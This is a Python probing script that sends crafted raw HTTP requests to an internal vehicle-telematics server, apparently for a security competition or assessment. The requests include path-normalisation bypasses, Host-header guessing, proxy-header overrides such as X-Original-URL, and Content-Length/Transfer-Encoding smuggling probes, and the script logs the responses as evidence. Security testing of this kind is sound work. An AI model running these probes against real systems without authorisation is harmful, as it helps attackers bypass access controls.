#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HTTP 层怪招 + vhost 路由测试 —— TSP 10.230.164.2:8080"""
import socket, time, sys, os, json

HOST = "10.230.164.2"; PORT = 8080
OUT = sys.argv[1] if len(sys.argv) > 1 else r"D:\qwb\03_EVIDENCE\tsp_s09"

def raw(req, timeout=6.0):
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((HOST, PORT)); s.sendall(req)
        buf = b""
        while True:
            try: c = s.recv(65536)
            except socket.timeout: break
            if not c: break
            buf += c
            if len(buf) > 300000: break
        return buf
    except socket.error as e:
        return b"ERR:" + str(e).encode()
    finally:
        try: s.close()
        except Exception: pass

def show(r):
    head, _, body = r.partition(b"\r\n\r\n")
    st = head.split(b"\r\n")[0].decode("latin1") if head else "<empty>"
    hdrs = [l.decode("latin1") for l in head.split(b"\r\n")[1:]]
    return st, hdrs, body

CASES = []
def add(name, req): CASES.append((name, req))

# ---- 1. 版本 / 请求行形态 ----
add("http10", b"GET /healthz HTTP/1.0\r\nHost: 10.230.164.2:8080\r\n\r\n")
add("http10_graphql", b"POST /graphql HTTP/1.0\r\nHost: 10.230.164.2:8080\r\nContent-Length: 2\r\n\r\n{}")
add("abs_uri_healthz", b"GET http://10.230.164.2:8080/healthz HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nConnection: close\r\n\r\n")
add("abs_uri_graphql", b"POST http://10.230.164.2:8080/graphql HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nContent-Length: 2\r\n\r\n{}")
add("abs_uri_ota", b"GET http://10.230.164.2:8080/ota/firmware HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nConnection: close\r\n\r\n")
add("connect", b"CONNECT 10.230.164.2:8080 HTTP/1.1\r\nHost: 10.230.164.2:8080\r\n\r\n")
add("connect_host", b"CONNECT example.com:443 HTTP/1.1\r\nHost: 10.230.164.2:8080\r\n\r\n")
add("options_star", b"OPTIONS * HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nConnection: close\r\n\r\n")
add("trace_healthz", b"TRACE /healthz HTTP/1.1\r\nHost: 10.230.164.2:8080\r\nConnection: close\r\n\r\n")
add("pri_h2", b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")

# ---- 2. 路径归一化 / 绕过 ----
for p in ["//healthz", "///healthz", "/.//healthz", "/./healthz", "/a/../healthz",
          "/healthz/.", "/healthz/..", "/healthz%2f", "/%2fhealthz", "/healthz%00",
          "/healthz%20", "/healthz;x", "/healthz%3b", "/healthz?", "/healthz#x",
          "/healthz/../graphql", "/graphql%2f", "/graphql/.", "/graphql/..",
          "/GRAPHQL", "/Healthz", "/HEALTHZ", "/%68ealthz", "/healthz%2F",
          "/" + "a" * 200 + "/healthz", "/" + "a" * 7000,
          "/ota/../healthz", "/graphql/../healthz"]:
    add("path:" + p[:40], f"GET {p} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nConnection: close\r\n\r\n".encode())

# ---- 3. vhost / 反向代理头 ----
HOSTS = ["tsp", "tsp.cv6", "cv6.local", "api.cv6", "fleet", "ota.cv6", "tsp.local",
         "localhost", "127.0.0.1", "10.230.164.2", "10.230.164.2:8080", "tsp:8080",
         "tbox", "cgw", "vcu", "internal", "admin", "cv6", "www.cv6", "ota",
         "tsp.cv6.local", "api.tsp.cv6", "backend", "server"]
for h in HOSTS:
    add(f"vhost_graphql[{h}]",
        f"POST /graphql HTTP/1.1\r\nHost: {h}\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{{}}".encode())
    add(f"vhost_ota[{h}]",
        f"GET /ota/firmware HTTP/1.1\r\nHost: {h}\r\nConnection: close\r\n\r\n".encode())

PXY = [("X-Forwarded-Host", "tsp.cv6"), ("X-Forwarded-Host", "ota.cv6"),
       ("X-Original-URL", "/graphql"), ("X-Original-URL", "/ota/firmware"),
       ("X-Rewrite-URL", "/graphql"), ("X-Rewrite-URL", "/ota/firmware"),
       ("X-Forwarded-Prefix", "/api"), ("X-Forwarded-Prefix", "/api/v1"),
       ("X-Forwarded-Uri", "/graphql"), ("X-HTTP-Method-Override", "POST"),
       ("X-Method-Override", "POST"), ("X-Real-IP", "127.0.0.1"),
       ("Forwarded", "host=tsp.cv6;proto=https"),
       ("X-Forwarded-Proto", "https"), ("X-Arbitrary", "1"),
       ("Content-Type", "application/json")]
for k, v in PXY:
    add(f"pxy[{k}={v}]_graphql",
        f"POST /graphql HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n{k}: {v}\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{{}}".encode())
    add(f"pxy[{k}={v}]_404",
        f"GET /ota/firmware HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n{k}: {v}\r\nConnection: close\r\n\r\n".encode())

# ---- 4. 大请求/怪 Content-Length ----
add("huge_header", b"GET /healthz HTTP/1.1\r\nHost: " + HOST.encode() + b":8080\r\n" +
    b"X-Pad: " + b"A" * 9000 + b"\r\nConnection: close\r\n\r\n")
add("neg_cl", b"POST /graphql HTTP/1.1\r\nHost: " + HOST.encode() +
    b":8080\r\nContent-Length: -1\r\n\r\n{}")
add("cl_te", b"POST /graphql HTTP/1.1\r\nHost: " + HOST.encode() +
    b":8080\r\nContent-Length: 2\r\nTransfer-Encoding: chunked\r\n\r\n2\r\n{}\r\n0\r\n\r\n")
add("dup_cl", b"POST /graphql HTTP/1.1\r\nHost: " + HOST.encode() +
    b":8080\r\nContent-Length: 2\r\nContent-Length: 5\r\n\r\n{}")

def main():
    os.makedirs(OUT, exist_ok=True)
    f = open(os.path.join(OUT, "12_http_tricks_vhost.txt"), "w", encoding="utf-8")
    f.write(f"# HTTP tricks + vhost  {time.strftime('%Y-%m-%dT%H:%M:%S')}  {HOST}:{PORT}\n")
    seen = {}
    for name, r in CASES:
        resp = raw(r)
        st, hdrs, body = show(resp)
        sig = (st.split(" ")[1] if st.count(" ") >= 1 else st, body.strip()[:80])
        seen.setdefault(sig, []).append(name)
        f.write(f"\n=== {name} ===\n--- REQ ---\n{r[:400].decode('latin1','replace')}\n"
                f"--- RESP ---\n{st}\n" + "\n".join(hdrs) + "\n\n"
                f"{body[:500].decode('latin1','replace')}\n")
        f.flush()
    f.write("\n\n=== 响应签名分组（同签名=同行为） ===\n")
    for sig, names in seen.items():
        f.write(f"\n[{len(names)}] code={sig[0]} body={sig[1]!r}\n  {names}\n")
    f.close()
    print("\n=== 分组 ===")
    for sig, names in seen.items():
        print(f"\n[{len(names)}] code={sig[0]} body={sig[1]!r}")
        print("   ", names[:40])

main()
